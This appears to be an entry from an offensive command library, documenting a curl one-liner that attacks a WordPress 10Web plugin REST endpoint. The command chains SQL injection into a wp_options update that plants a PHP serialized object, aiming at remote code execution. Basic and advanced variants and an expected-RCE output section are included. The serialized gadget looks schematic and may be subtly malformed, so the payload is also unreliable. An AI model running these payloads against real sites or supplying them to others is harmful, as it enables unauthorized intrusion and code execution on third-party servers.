---
id: command-uuid-2
name: curl-deserialization-payload
type: command
executor: bash
data: >-
  curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'id=1\'
  ; UPDATE wp_options SET
  option_value=\'O:21:"PHP\u0000Object":1:{s:6:"_data";s:7:"system";}\' WHERE
  option_name="vulnerable_option"--' -H 'Content-Type:
  application/x-www-form-urlencoded'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:08.525Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - rce
  - deserialization
  - web-exploit
verified: false
validated: true
submitted: true
---

# curl-deserialization-payload

## Command

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'id=1\' ; UPDATE wp_options SET option_value=\'O:21:"PHP\u0000Object":1:{s:6:"_data";s:7:"system";}\' WHERE option_name="vulnerable_option"--' -H 'Content-Type: application/x-www-form-urlencoded'
```

## Description

This command uses SQLi to inject a malicious PHP serialized object into the WordPress database, setting up insecure deserialization for RCE in the TenWeb plugin.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP POST method | Yes |
| `-d 'id=...'` | SQL update payload with serialized gadget | Yes |
| `-H 'Content-Type: ...'` | Request header | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'id=1\' ; UPDATE wp_options SET option_value=\'malicious-serialized-data\'--' -H 'Content-Type: application/x-www-form-urlencoded'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'trigger=1' -H 'Content-Type: application/x-www-form-urlencoded' -v
```

## Expected Output

Successful update confirmation or subsequent RCE output upon trigger, such as command results.

## Related

- [[Related Procedure: Chain-SQL-Injection-to-Insecure-Deserialization-for-RCE]]
